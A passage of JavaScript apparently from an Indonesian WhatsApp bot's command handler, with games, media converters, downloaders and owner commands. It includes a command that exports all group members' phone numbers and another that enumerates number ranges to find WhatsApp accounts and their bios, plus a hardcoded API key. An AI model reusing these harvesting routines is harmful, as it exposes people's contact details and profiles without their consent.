					let moneyy = `${Math.floor(Math.random() * 999999999999999)}`.trim()
db.data.users[m.sender].limit += moneyy * 1
    m.reply(`Bot Sudah Memasukan limit Sebesar ${moneyy} Ke Owner`)
    }
    break
    	    case 'tflimit': {
  if (isGroup) {
    const [userMention, amountStr] = args;    
    if (!userMention || !amountStr) {
      throw 'Gunakan: *.tflimit @user jumlahLimit*';
    }    
    const targetUser = m.mentionedJid[0];
    const amount = parseFloat(amountStr);    
    if (isNaN(amount) || amount <= 0) {
      throw 'Jumlah limit harus berupa angka positif.';
    }    
    const senderLimit = db.data.users[m.sender].limit;    
    if (senderLimit < amount) {
      throw 'Limit Anda tidak mencukupi untuk mentransfer sejumlah ini.';
    }    
    if (!db.data.users[targetUser]) {
      throw 'Pengguna yang Anda tuju tidak ditemukan.';
    }    
    db.data.users[m.sender].limit -= amount;
    db.data.users[targetUser].limit += amount;    
    m.reply(`Anda telah mentransfer ${amount} limit ke @${targetUser.replace('@s.whatsapp.net', '')}.`);
  } else {
    throw 'Perintah ini hanya dapat digunakan dalam grup.';
  }
  break;
}
    case 'tfbalance': {
  if (isGroup) {
    const [userMention, amountStr] = args;    
    if (!userMention || !amountStr) {
      throw 'Gunakan: *.tfbalance @user jumlahbalance*';
    }    
    const targetUser = m.mentionedJid[0];
    const amount = parseFloat(amountStr);    
    if (isNaN(amount) || amount <= 0) {
      throw 'Jumlah balance harus berupa angka positif.';
    }    
    const senderbalance = db.data.users[m.sender].balance;    
    if (senderbalance < amount) {
      throw 'balance Anda tidak mencukupi untuk mentransfer sejumlah ini.';
    }    
    if (!db.data.users[targetUser]) {
      throw 'Pengguna yang Anda tuju tidak ditemukan.';
    }    
    db.data.users[m.sender].balance -= amount;
    db.data.users[targetUser].balance += amount;    
    m.reply(`Anda telah mentransfer ${amount} balance ke @${targetUser.replace('@s.whatsapp.net', '')}.`);
  } else {
    throw 'Perintah ini hanya dapat digunakan dalam grup.';
  }
  break;
}
            case 'attp2':
                try {
                    if (args1.length == 0) return m.reply(`Example: ${prefix + command} Yori Hosting`)
                    await sky.sendMessage(m.chat, {sticker: {url:`https://api.lolhuman.xyz/api/attp2?apikey=Gata_Dios&text=${args}` }}, { quoted: m })
                } catch (e) {
                    m.reply(mess.error)
            }
            break
            	           	        
            case 'toimage': case 'toimg': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!/webp/.test(mime)) throw `Reply sticker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
                let media = await sky.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    sky.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
	                    case 'toaud': case 'toaudio': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await sky.downloadMediaMessage(qmsg)
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            sky.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await sky.downloadMediaMessage(qmsg)
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            sky.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${sky.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await sky.downloadMediaMessage(qmsg)
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            sky.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            
             case 'paptt':
if (!q) return m.reply(`Example paptt foto/video`)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
                db.data.users[m.sender].limit -= 300 // -1 limit
let papttfoto = JSON.parse(fs.readFileSync('./database/paptt-foto.json'))
let papttvideo = JSON.parse(fs.readFileSync('./database/paptt-video.json'))
let titid1 = (pickRandom(papttfoto))
let titid2 = (pickRandom(papttvideo))
if (q == 'foto') {
m.reply("Foto Akan Dikirim Lewat Private Chat ( *PC* )")
                sky.sendMessage(m.sender, { image: { url: titid1 }, caption: 'Mana Tahan😛'}, { quoted: fkontak })
            } else if (q == 'video') {
m.reply("Video Akan Dikirim Lewat Private Chat ( *PC* )")
                sky.sendMessage(m.sender, { video: { url: titid2 }, caption: 'Mana Tahan🙈'}, { quoted: fkontak })
            }
break
            case 'imagenobg': 	    
case 'search':
case 'yts': case 'ytsearch': {
 if (!text) return m.reply(`Example : ${prefix + command} story wa anime`)
 let yts = require("yt-search")
 let search = await yts(text)
 let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
 let no = 1
 for (let i of search.all) {
 teks += `No : ${no++}\nVideo ID : ${i.videoId}\nTitle : ${i.title}\nViews : ${i.views}\nDuration : ${i.timestamp}\nUploaded : ${i.ago}\nUrl : ${i.url}\n\n─────────────────\n\n`
 }
 sky.sendMessage(m.chat, { image: { url: search.all[0].thumbnail }, caption: teks }, { quoted: fkontak })
 }
 break
              
	  case 'playmusic':      
			case 'savekontak': case 'svkontak':
if (!isCreator) throw mess.owner
let cmiggc = await sky.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
} // (?); mengimpor kontak seluruh member - save
let nmfilect = './contacts.vcf'
m.reply('*Mengimpor '+cmiggc.participants.length+' kontak..*')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
sky.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
break	
case 'wanumber': case 'searchno': case 'searchnumber':{
  if (!isPrem) return replyprem(mess.premium)
           	if (!text) return m.reply(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        m.reply(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await sky.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await sky.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        m.reply(`${text66}${nobio}${nowhatsapp}`)
        }
break
case 'factornumber': {
    if (!text) {
        return m.reply(`Provide a number to get its prime factors.\n\nExample: ${prefix + command} 60`);
    }

    const number = parseInt(text);
    if (isNaN(number)) {
        return m.reply('Invalid number. Please provide a valid number.');
    }

    function getPrimeFactors(n) {
        const factors = [];
        let divisor = 2;

        while (n >= 2) {
            if (n % divisor === 0) {
                factors.push(divisor);
                n = n / divisor;
            } else {
                divisor++;
            }
        }

        return factors.join(', ');
    }

    const primeFactors = getPrimeFactors(number);
    if (primeFactors.length === 0) {
        m.reply(`${number} is a prime number with no prime factors.`);
    } else {
        m.reply(`Prime factors of ${number}: ${primeFactors}`);
    }
}
break;
case 'aboutnumber': {
    const axios = require('axios');

    if (!text) {
        return m.reply(`Provide a number to get a fun fact about it.\n\nExample: ${prefix + command} 42`);
    }

    const number = parseInt(text);
    if (isNaN(number)) {
        return m.reply('Invalid number. Please provide a valid number.');
    }

    axios.get(`http://numbersapi.com/${number}`)
        .then(response => {
            const fact = response.data;
            m.reply(`Fun fact about ${number}: ${fact}`);
        })
        .catch(error => {
            m.reply('Failed to fetch number fact. Please try again later.');
        });
}
break;
	    case 'getmusic': {
 // Pastikan pengguna menyertakan nomor
 if (!text) return m.reply(`Contoh: ${prefix + command} 1`);

 // Ambil pesan yang direply
 if (!m.quoted) return m.reply('Balas pesan yang berisi hasil pencarian YouTube');

 // Ambil teks dari pesan yang dibalas
 let quotedText = m.quoted.text;

 // Regex untuk menangkap URL YouTube dari pesan yang dibalas
 let regex = /No\s*:\s*(\d+)\s*[\s\S]*?Url\s*:\s*(https?:\/\/youtube\.com\/watch\?v=[a-zA-Z0-9_-]+)/g;
 let matches = [];
 let match;

 // Mencari semua URL yang cocok dengan regex
 while ((match = regex.exec(quotedText)) !== null) {
 matches.push({ number: parseInt(match[1]), url: match[2] });
 }

 // Cek jika tidak ada URL yang ditemukan
 if (matches.length === 0) return m.reply('Tidak ada link YouTube yang valid di pesan ini');

 // Cari URL sesuai dengan nomor yang diminta
 let index = parseInt(text) - 1;
 if (isNaN(index) || index < 0 || index >= matches.length) return m.reply('Nomor yang Anda masukkan tidak valid');

 // Ambil URL yang sesuai dengan nomor
 let selectedUrl = matches[index].url;

 // Kirim balasan bahwa sedang memproses download
 m.reply('Sedang memproses...');

 // Panggil fungsi untuk mendownload MP3 dari URL yang dipilih
 downloadMp3(selectedUrl);
}
break;
            case 'getvideo': {
 const ler = require('./lib/ytdl2');
 
 // Pastikan pengguna menyertakan nomor video
 if (!text) return m.reply(`Contoh: ${prefix + command} 1,2,3`);
 
 // Ambil pesan yang direply
 if (!m.quoted) return m.reply('Balas pesan yang ingin diunduh.');
 
 // Ambil teks dari pesan yang dibalas
 let quotedText = m.quoted.text;
 
 // Regex untuk menangkap URL YouTube dari pesan yang dibalas
 let regex = /No\s*:\s*(\d+)\s*[\s\S]*?Url\s*:\s*(https?:\/\/youtube\.com\/watch\?v=[a-zA-Z0-9_-]+)/g;
 let matches = [];
 let match;
 
 // Mencari semua URL yang cocok dengan regex
 while ((match = regex.exec(quotedText)) !== null) {
 matches.push({ number: parseInt(match[1]), url: match[2] });
 }
 
 // Cek jika tidak ada URL yang ditemukan
 if (matches.length === 0) return m.reply('Tidak dapat menemukan tautan video YouTube dalam pesan yang dibalas.');
 
 // Memecah input text menjadi array nomor berdasarkan koma
 let indices = text.split(',').map(num => parseInt(num.trim()));
 
 // Cek jika ada nomor yang tidak valid
 if (indices.some(isNaN)) return m.reply('Masukkan nomor yang valid.');
 
 m.reply('Sedang mengunduh video...'); // Informasikan ke pengguna bahwa video sedang diunduh
 
 // Loop melalui setiap nomor dan unduh video yang sesuai
 for (let index of indices) {
 let selected = matches.find(match => match.number === index);
 
 if (!selected || !ler.isYTUrl(selected.url)) {
 m.reply(`Tautan tidak valid pada nomor: ${index}`);
 continue;
 }
 
 try {
 const vid = await ler.mp4(selected.url);
 const apala = `
 *Tittle:* ${vid.title}
 *Date:* ${vid.date}
 *Duration:* ${vid.duration}
 *Quality:* ${vid.quality}`;

 // Kirim video ke pengguna
 await sky.sendMessage(m.chat, {
 video: { url: vid.videoUrl },
 caption: apala
 }, { quoted: m });

 } catch (err) {
 console.error(`Error downloading video at index ${index}:`, err);
 m.reply(`Gagal mengunduh video pada nomor: ${index}. Silakan coba lagi nanti.`);
 }
 }
 
 m.reply('Video berhasil diunduh.');
}
break
case 'pinterest': {
 if (!isPrem) return replyprem(mess.premium)
    const [query, count] = text.split(' | ');

    if (!query || !count || isNaN(count)) {
        return m.reply(`Contoh: ${prefix + command} ghost | 7`);
    }

    m.reply(mess.wait);

    let { pinterest } = require('./lib/scraper');
    anu = await pinterest(query);

    const numImagesToSend = parseInt(count);
    const selectedImages = [];

    for (let i = 0; i < numImagesToSend && i < anu.length; i++) {
        selectedImages.push(anu[i]);
    }

    for (const result of selectedImages) {
        sky.sendMessage(m.chat, { image: { url: result }, caption: mess.done }, { quoted: m });
    }
}
break;

	    case 'couple': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                m.reply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                sky.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                sky.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break	    
 case 'joker': case 'harley': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
  m.reply(mess.wait)
let { data } = await axios.get(`https://api.akuari.my.id/randomimage/${command}`)
	if (data.message) return m.reply(JSON.stringify(data))
	await sky.sendMessage(m.chat, { image: { url: data.respon }, caption: mess.done }, { quoted: m })
}
break

            case 'coffe': case 'kopi': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
            let Message = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `☕ Random Coffe`
                }
                sky.sendMessage(m.chat, Message, { quoted: m })
            }
            break
            case 'wallpaper': {
 if (!text) throw `nyari apa?`
 const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = require('@whiskeysockets/baileys');

 m.reply(mess.wait);
 pinterest(`${q}`)
 .then(async (result) => {
 if (result.status === 200 && result.result.length > 0) {
 let imageUrl = result.result[Math.floor(Math.random() * result.result.length)];
 let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender],
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterName: `gas`,
 newsletterJid: "33451220170@s.whatsapp.net",
 serverMessageId: 143
 },
 businessMessageForwardInfo: {
 businessOwnerJid: sky.decodeJid(sky.user.id)
 },
 },
 body: proto.Message.InteractiveMessage.Body.create({
 text: `${q}` // Menggunakan input pencarian di sini
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: "© avosky"
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "",
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia({ image: { url: imageUrl } }, { upload: sky.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"next\",\"id\":\"pin ${q}\"}`
 },
 ]
 })
 })
 }
 }
 }, {});
 sky.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
 });
 } else {
 m.reply(`Tidak dapat menemukan gambar untuk "${q}".`);
 }
 })
 .catch((error) => {
 console.error(error);
 m.reply('Terjadi kesalahan dalam mencari gambar.');
 });
}
break
case 'membangunrumah': {
    const maxRounds = 5; // Jumlah ronde maksimal
    let userHouse = {
        foundation: 0,
        walls: 0,
        roof: 0,
    };
    let computerHouse = {
        foundation: 0,
        walls: 0,
        roof: 0,
    };

    function computerTurn() {
        const randomChoice = Math.floor(Math.random() * 3) + 1;
        switch (randomChoice) {
            case 1:
                computerHouse.foundation++;
                return 'Dasar rumah dibangun.';
            case 2:
                if (computerHouse.foundation > 0) {
                    computerHouse.walls++;
                    return 'Dinding rumah dipasang.';
                } else {
                    return 'Komputer belum dapat membangun dinding, karena belum ada dasar rumah.';
                }
            case 3:
                if (computerHouse.walls > 0) {
                    computerHouse.roof++;
                    return 'Atap rumah diatur.';
                } else {
                    return 'Komputer belum dapat mengatur atap, karena belum ada dinding rumah.';
                }
            default:
                return 'Komputer tidak dapat melakukan aksi.';
        }
    }

    await m.reply('Selamat datang di permainan Membangun Rumah! Mari mulai membangun rumah.');

    for (let round = 1; round <= maxRounds; round++) {
        const userChoice = Math.floor(Math.random() * 3) + 1;

        switch (userChoice) {
            case 1:
                userHouse.foundation++;
                await m.reply('Anda berhasil membangun dasar rumah!');
                break;
            case 2:
                if (userHouse.foundation > 0) {
                    userHouse.walls++;
                    await m.reply('Anda berhasil memasang dinding rumah!');
                } else {
                    await m.reply('Anda harus membangun dasar rumah terlebih dahulu.');
                }
                break;
            case 3:
                if (userHouse.walls > 0) {
                    userHouse.roof++;
                    await m.reply('Anda berhasil mengatur atap rumah!');
                } else {
                    await m.reply('Anda harus memasang dinding rumah terlebih dahulu.');
                }
                break;
        }

        const computerResponse = computerTurn();
        await m.reply(`Giliran komputer: ${computerResponse}`);
    }

    const userTotalProgress = userHouse.foundation + userHouse.walls + userHouse.roof;
    const computerTotalProgress = computerHouse.foundation + computerHouse.walls + computerHouse.roof;

    let result = `🏠 Permainan Membangun Rumah berakhir!\n\n`;
    result += `Hasil pembangunan Anda:\nDasar Rumah: ${userHouse.foundation}\nDinding Rumah: ${userHouse.walls}\nAtap Rumah: ${userHouse.roof}\n`;
    result += `Total Progress Anda: ${userTotalProgress} / 3\n\n`;
    result += `Hasil pembangunan Komputer:\nDasar Rumah: ${computerHouse.foundation}\nDinding Rumah: ${computerHouse.walls}\nAtap Rumah: ${computerHouse.roof}\n`;
    result += `Total Progress Komputer: ${computerTotalProgress} / 3\n\n`;

    if (userTotalProgress > computerTotalProgress) {
        result += `Selamat! Anda berhasil membangun rumah lebih baik daripada komputer!`;
    } else if (userTotalProgress < computerTotalProgress) {
        result += `Sayang sekali, komputer berhasil membangun rumah lebih baik daripada Anda.`;
    } else {
        result += `Pertandingan berakhir imbang! Keduanya membangun rumah dengan kemajuan yang sama.`;
    }

    await m.reply(result);
}
break;
case 'petualanganepik': {
    if (!m.mentionedJid || m.mentionedJid.length !== 5) {
        return await m.reply('Tag lima pengguna untuk memulai permainan petualangan epik.')
    }

    const participants = m.mentionedJid;
    const maxRounds = 10; // Jumlah ronde maksimal

    let result = `🛡️ Petualangan epik dimulai! 🛡️\n\n`;

    function generateRandomAction() {
        const actions = [
            'Serangan pedang',
            'Serangan panah',
            'Serangan sihir',
            'Serangan mukul',
            'Serangan tusukan',
        ];
        return actions[Math.floor(Math.random() * actions.length)];
    }

    function calculateDamage(action) {
        return Math.floor(Math.random() * 30) + 10;
    }

    function calculateTotalDamage(participant) {
        let totalDamage = 0;
        for (let i = 0; i < maxRounds; i++) {
            totalDamage += calculateDamage(generateRandomAction());
        }
        return totalDamage;
    }

    function getCharacterEmoji(participant) {
        const emojis = ['🛡️', '⚔️', '🏹', '🔮', '🔨'];
        return emojis[participants.indexOf(participant)];
    }

    for (let round = 1; round <= maxRounds; round++) {
        result += `⚔️ Tahap ${round}\n\n`;

        for (const participant of participants) {
            let action = generateRandomAction();
            let damage = calculateDamage(action);

            result += `${getCharacterEmoji(participant)} @${participant.split('@')[0]} melakukan aksi: ${action} - Menyebabkan ${damage} kerusakan!\n`;
        }

        result += '\n';
    }

    result += `\n🏁 Petualangan epik berakhir!\n\n`;

    let winner = participants[0];
    let highestDamage = calculateTotalDamage(participants[0]);

    for (const participant of participants) {
        let totalDamage = calculateTotalDamage(participant);

        if (totalDamage > highestDamage) {
            winner = participant;
            highestDamage = totalDamage;
        }
    }

    result += `🎉 Pemenang petualangan epik adalah ${getCharacterEmoji(winner)} @${winner.split('@')[0]}!`;
    await m.reply(result);
}
break
case 'tesss':{
if (!isCreator) return m.reply(mess.owner)
m.reply('U Dah Owner')
}
break
case 'addowner':
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 628****`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await sky.onWhatsApp(bnnd)
if (ceknye.length == 0) return m.reply(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
m.reply(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
 if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Use ${prefix+command} nomor\nExample ${prefix+command} 62882022339839`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
m.reply(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'akinator': {
                    if (akinator.hasOwnProperty(m.sender.split('@')[0])) throw ("Selesein yg sebelumnya dulu atuh")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/akinator/start?apikey=Gata_Dios`)
                    let { server, frontaddr, session, signature, question, step } = get_result.result
                    const data = {}
                    data["server"] = server
                    data["frontaddr"] = frontaddr
                    data["session"] = session
                    data["signature"] = signature
                    data["question"] = question
                    data["step"] = step
                    imi_txt = `🤔🤔\n${question}\n\n`
                    imi_txt += "0 - Ya\n"
                    imi_txt += "1 - Tidak\n"
                    imi_txt += "2 - Saya Tidak Tau\n"
                    imi_txt += "3 - Mungkin\n"
                    imi_txt += "4 - Mungkin Tidak"
                    sky.sendText(m.chat, imi_txt, m).then(() => {
                        akinator[m.sender.split('@')[0]] = data
                        fs.writeFileSync("./src/akinator.json", JSON.stringify(akinator))
                    })                
                    }   
                    break
                case 'cancelakinator': {
                    if (!akinator.hasOwnProperty(m.sender.split('@')[0])) throw ("Anda tidak memiliki akinator sebelumnya")
                    delete akinator[m.sender.split('@')[0]]
                    fs.writeFileSync("./src/akinator.json", JSON.stringify(akinator))
                    m.reply("Success mengcancel akinator sebelumnya")
                    }
                    break		
		// Akinator menu end
            case 'kisahnabi': {
 if (!q) return m.reply(`Nama Nabinya?`)
 let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`) 
 let kisah = await url.json().catch(_ => "Error") 
 if (kisah == "Error") throw "*Not Found*\n*pake huruf kecil coba *" 
 
 let hasil = `_*Nama Nabi :*_ ${kisah.name} 
 _*Tanggal Lahir :*_ ${kisah.thn_kelahiran} 
 _*Tempat Lahir :*_ ${kisah.tmp} 
 _*Usia :*_ ${kisah.usia} 
 
 * — [ K I S A H ] — * 
 
 ${kisah.description}` 
 
 m.reply(hasil) 
}
break
			
            case 'wikimedia': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw 'Masukkan Query Title'
		let { wikimedia } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let Message = {
                    image: { url: result.image },
                    caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`
                }
                sky.sendMessage(m.chat, Message, { quoted: m })
            }
            break
            
case 'quotesanime': case 'quoteanime': {
  if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
  let { quotesAnime } = require('./lib/scraper');
  
  try {
    let anu = await quotesAnime();
    let result = anu[Math.floor(Math.random() * anu.length)];
    
    let Message = {
      text: `~_${result.quotes}_\n\nBy : ${result.karakter}\nJudul : ${result.anime}\nEps : ${result.episode}\n\n- ${result.up_at}`
    };
    
    sky.sendMessage(m.chat, Message, { quoted: fkontak });
  } catch (error) {
    console.error(error);
    m.reply('Terjadi kesalahan saat mengambil kutipan anime.');
  }
  break;
}

                    
	    case 'nomerhoki': case 'nomorhoki': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!Number(text)) throw `Example : ${prefix + command} 6288292024190`
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} belanja`
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            //NEW
 case 'factornumber': {
    if (!text) {
        return m.reply(`Provide a number to get its prime factors.\n\nExample: ${prefix + command} 60`);
    }

    const number = parseInt(text);
    if (isNaN(number)) {
        return m.reply('Invalid number. Please provide a valid number.');
    }

    function getPrimeFactors(n) {
        const factors = [];
        let divisor = 2;

        while (n >= 2) {
            if (n % divisor === 0) {
                factors.push(divisor);
                n = n / divisor;
            } else {
                divisor++;
            }
        }

        return factors.join(', ');
    }

    const primeFactors = getPrimeFactors(number);
    if (primeFactors.length === 0) {
        m.reply(`${number} is a prime number with no prime factors.`);
    } else {
        m.reply(`Prime factors of ${number}: ${primeFactors}`);
    }
}
break;
case 'aboutnumber': {
    const axios = require('axios');

    if (!text) {
        return m.reply(`Provide a number to get a fun fact about it.\n\nExample: ${prefix + command} 42`);
    }

    const number = parseInt(text);
    if (isNaN(number)) {
        return m.reply('Invalid number. Please provide a valid number.');
    }

    axios.get(`http://numbersapi.com/${number}`)
        .then(response => {
            const fact = response.data;
            m.reply(`Fun fact about ${number}: ${fact}`);
        })
        .catch(error => {
            m.reply('Failed to fetch number fact. Please try again later.');
        });
}
break;       
// ...
// ...

case 'adupahlawan': {
 const namaPahlawan = ['goku', 'naruto', 'sasuke', 'allmight', 'saitama', 'zen', 'iky', 'itachi', 'luffy', 'eren'];
    const pilihan = args[0]?.toLowerCase();

    if (!pilihan) {
        return await m.reply(`Pilihan pahlawan yang tersedia: ${namaPahlawan.join(', ')}`);
    }
    if (!namaPahlawan.includes(pilihan)) {
        return await m.reply('Pilihan pahlawan tidak valid. Pilihan yang tersedia: ' + namaPahlawan.join(', '));
    }

    const lawanPilihan = namaPahlawan[Math.floor(Math.random() * namaPahlawan.length)];

    let userScore = 0;
    let lawanScore = 0;
    let maxRounds = 15; // Jumlah ronde maksimal
    let round = 1;
    let result = `⚔️ Mulai permainan adu pahlawan dengan ${pilihan} melawan ${lawanPilihan} ⚔️\n\n`;

    while (round <= maxRounds) {
        let userAction = Math.random() < 0.5 ? 'serang' : 'bertahan';
        let lawanAction = Math.random() < 0.5 ? 'serang' : 'bertahan';

